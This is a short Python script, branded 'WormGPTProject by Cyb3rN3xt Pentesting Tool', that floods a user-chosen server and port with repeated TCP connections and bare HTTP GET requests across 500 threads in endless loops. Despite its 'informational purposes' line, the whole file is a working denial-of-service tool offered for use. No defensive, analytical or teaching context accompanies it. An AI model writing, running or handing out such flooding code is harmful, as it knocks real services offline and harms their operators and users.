import socket
import threading
import time

def ddos(target, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            sock.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
            print(f"Sending packet to {target}:{port}")
            sock.close()
            time.sleep(0.01)  # Delay to slow down packet sending
        except Exception as e:
            print(f"Error: {e}")

def main():
    print("\033[32m")
    print(r"""
   
 #     #                       #####               ######  
 #  #  #  ####  #####  #    # #     # #####  ##### #     # 
 #  #  # #    # #    # ##  ## #       #    #   #   #     # 
 #  #  # #    # #    # # ## # #  #### #    #   #   ######  
 #  #  # #    # #####  #    # #     # #####    #   #       
 #  #  # #    # #   #  #    # #     # #        #   #       
  ## ##   ####  #    # #    #  #####  #        #   #      

    """)
    print("\033[0m")
    print("Welcome to WormGPTProject by Cyb3rN3xt Pentesting Tool")
    print("Created for informational purposes.\n")
    target = input("Enter target server address: ")
    port = int(input("Enter target port: "))

    for _ in range(500):
        thread = threading.Thread(target=ddos, args=(target, port))
        thread.start()

if __name__ == "__main__":
    main()
